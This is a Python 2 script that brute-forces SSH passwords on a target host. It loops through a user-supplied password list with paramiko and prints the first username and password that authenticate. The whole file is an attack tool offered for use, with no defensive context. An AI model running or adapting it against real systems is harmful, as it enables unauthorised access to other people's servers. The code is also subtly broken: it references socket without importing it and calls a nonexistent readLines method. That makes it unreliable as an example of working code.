#!/usr/bin/env python
#Author: jtoddp14 
#Updated February 26, 2018
import paramiko, sys #Paramiko is for SSH, sys returns the integers needed
target = ''
username = ''
passList = ''
lineBreak = "\n ----------------------------------------------------------------\n" #Used to make things look pretty

try: #User inputs data here
	target = raw_input("* Enter Target Address: ")
	username = raw_input("* Enter SSH Username: ") 
	passList = raw_input("* Enter Password List: ")
except KeyboardInterrupt: #Stops the process on keyboard press
	print "\n\n* User Abort..."
	sys.exit(3) 

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient() 
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#Sets up connection to the SSH and attempts a password, then returns an integer
	try: 
		ssh.connect(target, port=22, username=username, password=password) #Set as default port 22, change as needed
	except paramiko.AuthenticationException: 
		code = 1 #Returns 1 for invalid credentials
	except socket.error, e:
		code = 2 #Returns 2 if it cannot connect
		
	ssh.close()
	return code #Returns 0 if the authentication worked
	
passList = open(passList)

print ""

for i in passList.readLines(): #Goes through every option on the password list and attempts a connection
	password = i.strip("\n")
	try:
		result = ssh_connect(password)

		if result == 0:
			print("%s* Username: %s * Password: %s%s" % (lineBreak, username, password, lineBreak))
			sys.exit(0) #Prints out a successful password
		elif result == 1:
			print("* Username: %s * Password: %s !! Invalid Credentials !!" % (username, password))
		elif result == 2:
			print("!! Connection Cannot Be Established !!")
			sys.exit(2) 
	except Exception, e:
		print e
		pass
		
passList.close()
